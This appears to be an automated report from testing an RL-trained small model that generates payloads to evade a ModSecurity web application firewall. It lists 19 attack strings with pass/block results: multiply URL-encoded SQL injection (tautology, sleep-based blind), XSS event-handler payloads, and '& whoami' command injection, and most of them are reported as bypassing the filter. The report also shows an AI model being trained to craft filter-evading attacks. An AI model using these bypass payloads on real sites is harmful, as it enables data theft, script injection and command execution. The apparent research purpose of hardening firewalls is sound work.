# Gemma 2 2B Phase 4 RL - Probing Test Report

**Date:** 20251208_004211

**Model:** Gemma_2_2B_Phase4_RL

**Remote WAF:** http://modsec.llmshield.click

## Summary

- **Scenarios:** 6/6 successful (100.0%)
- **Total Probes:** 19
- **Successful Probes:** 16/19 (84.2%)

## Scenario Results

### 1. SQLI - Extract database version

**Status:** ✅ SUCCESS

**Probes:** 3/5

**Probing History:**

1. ✅ PASSED - 200 OK [Executed]
   - Payload: `1%252520OR%2525201%25253D1`
2. ✅ PASSED - 200 OK [Executed]
   - Payload: `1%252520or%2525201%25253d1`
3. ✅ PASSED - 200 OK [Executed]
   - Payload: `1%252520or%2525201%25253d1`

### 2. SQLI - Boolean-based blind injection

**Status:** ✅ SUCCESS

**Probes:** 3/5

**Probing History:**

1. ✅ PASSED - 200 OK
   - Payload: `%2527%2520AnD%2520%2528SEleCt%25201%2520froM%2520%2528SEleCt%2528SLEep%25285%2529%2529%2529A%2529--%2520`
2. ✅ PASSED - 200 OK
   - Payload: `%2527%2520and%2520%2528select%25201%2520from%2520%2528select%2528sleep%25285%2529%2529%2529A%2529--%2520`
3. ✅ PASSED - 200 OK
   - Payload: `%2527%2529%2529%2520or%2520%25271%2527%253D%25271%2527%253B%2520COMMIT%2520%2527%2527%253B--%2520`

### 3. SQLI - UNION SELECT attack

**Status:** ✅ SUCCESS

**Probes:** 3/5

**Probing History:**

1. ✅ PASSED - 200 OK [Executed]
   - Payload: `1%252525252520OR%2525252525201%25252525253D1`
2. ✅ PASSED - 200 OK
   - Payload: `%2527%2520AnD%2520%2528SeLEct%25201%2520fROM%2520%2528selEct%2528slEEP%25285%2529%2529%2529A%2529--%2520`
3. ✅ PASSED - 200 OK [Executed]
   - Payload: `1%2527%2520OR%25201%253D1%2523`

### 4. XSS - Execute JavaScript alert

**Status:** ✅ SUCCESS

**Probes:** 3/5

**Probing History:**

1. ✅ PASSED - 200 OK
   - Payload: `%253cSVG/onloAd%253dAlErT%25281%2529%253e`
2. ✅ PASSED - 200 OK
   - Payload: `%253Csvg/onloAd%253DalerT%25281%2529%253E`
3. ✅ PASSED - 200 OK
   - Payload: `%253Cdetails%2520onfocus%253Dalert%25281%2529%2520tabindex%253D1%253E`

### 5. XSS - DOM-based XSS

**Status:** ✅ SUCCESS

**Probes:** 4/5

**Probing History:**

1. ❌ BLOCKED - 403 Forbidden
   - Payload: `<div onmouseover="alert(1)" onmouseout="alert(2)"></div>`
2. ❌ BLOCKED - 403 Forbidden
   - Payload: `<img src="x//%253Cscript%253Ealert%25281%2529%253C/script%253E" onerror="alert(1)" onload="alert(1)">`
3. ❌ BLOCKED - 403 Forbidden
   - Payload: `<INPUT type=TEXT value=x ondblclick=alert(1) />`
4. ✅ PASSED - 200 OK
   - Payload: `<%253cAUDIO%2520ONPAUSE%253d%2527PROMPT%25281%2529%2527%253e%253c%252fAUDIO%253e%253c%252fDIV%253e`

### 6. OS_INJECTION - Execute system command

**Status:** ✅ SUCCESS

**Probes:** 3/5

**Probing History:**

1. ✅ PASSED - 200 OK
   - Payload: `%2526%2520wH+oAmI`
2. ✅ PASSED - 200 OK
   - Payload: `%2526%2520whoami`
3. ✅ PASSED - 200 OK
   - Payload: `%2526%2520whoami`

